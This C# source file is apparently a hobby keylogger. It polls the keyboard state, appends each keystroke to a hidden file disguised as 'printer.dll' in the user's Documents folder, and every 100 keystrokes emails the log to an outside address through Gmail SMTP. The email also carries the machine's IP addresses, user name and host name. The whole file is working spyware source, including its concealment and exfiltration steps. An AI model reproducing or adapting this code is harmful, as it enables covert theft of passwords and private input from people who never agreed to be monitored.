using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace keylogger
{
    class Program
    {

        [DllImport("User32.dll")]

        // receive the "recently pressed" bit 
        public static extern int GetAsyncKeyState(Int32 i);


        // string to hold all of the keystrokes(les frappes au clavier) 
        static long numberOfKeyStrokes = 0;
        static void Main(string[] args)
        {
            // the file path of my documents folder
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if(!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            //string path = (filepath + @"\keystrokes.txt");
            string path = (filepath + @"\printer.dll");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path));
            }

            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);

            // 1. capture keystrokes and display them to the cancel
            while (true)
            {
                // pause and let other programs get a chance to run.
                //5 miliseconds,  we will tell to the program to sleep, because we are in an infinite loop, it's going to do a lot of compilation, we are putting in a risk they system. A thread is defined as the execution path of a program. Each thread defines a unique flow of control. If your application involves complicated and time consuming operations, then it is often helpful to set different execution paths or threads, with each thread performing a particular job.

                Thread.Sleep(5); 
                // check all keys for their state.
                for (int i = 32; i < 127; i++) // Why are we beggining from 32, cause in ASCII the caracters that we need begin from 32 to 127
                {
                    // The important part from this program is this function.  If the most significant bit is set, the key is down, and if the least significant bit is set, the key was pressed after the previous call to GetAsyncKeyState.
                    int keyState = GetAsyncKeyState(i);

                    // 32769 means pressed after the previous call to GetAsyncKeyState and 32767 means not pressed.
                    // print to the console
                    if (keyState == 32769) 
                    {

                        Console.Write((char) i + " , ");
                        // 2. If the letter has been pressed, we'll take the strokes into a text file
                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i);
                        }
                        
                        numberOfKeyStrokes++;

                        // SendNewMessage(); Will send the message every single time when we type the keystroke, it's excessive
                        // So we'll limite it(for example: every 100 characters --> easy to test) 
                        if(numberOfKeyStrokes % 100 == 0)
                        {
                            SendNewMessage();

                        }
                    }
                }


                // 3. perodically send the contents of the file to an external email adress.

            }



        } // main

        //Send the contents of the text file to an external email address
        static void SendNewMessage()
        {
            String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = folderName + @"\printer.dll";

            String logContents = File.ReadAllText(filePath);
            string emailBody = "";
            // Create an email message

            DateTime now = DateTime.Now;
            string subject = "Message from Zuli's keylloger";
            // I will get the computer's name
            var host = Dns.GetHostEntry(Dns.GetHostName());
            // The comp may have multiple IP adress, so we'll do foreach loop to go through the host record
            foreach(var address in host.AddressList)
            {
                emailBody += "Address: " + address;
            }

            emailBody += "\n User: " + Environment.UserDomainName + " \\ " + Environment.UserName;
            emailBody += "\n Host: " + host;
            emailBody += "\n Time: " + now.ToString();
            emailBody += logContents;


            // Email transfer protocol
            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress("yourmail@gmail.com");
            mailMessage.To.Add("yourmail@gmail.com");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            // True cause anything that gmail uses comes as encrypted msg
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("yourmail@gmail.com", "yourpassword123");
            mailMessage.Body = emailBody;

            client.Send(mailMessage);

        }
    }
}
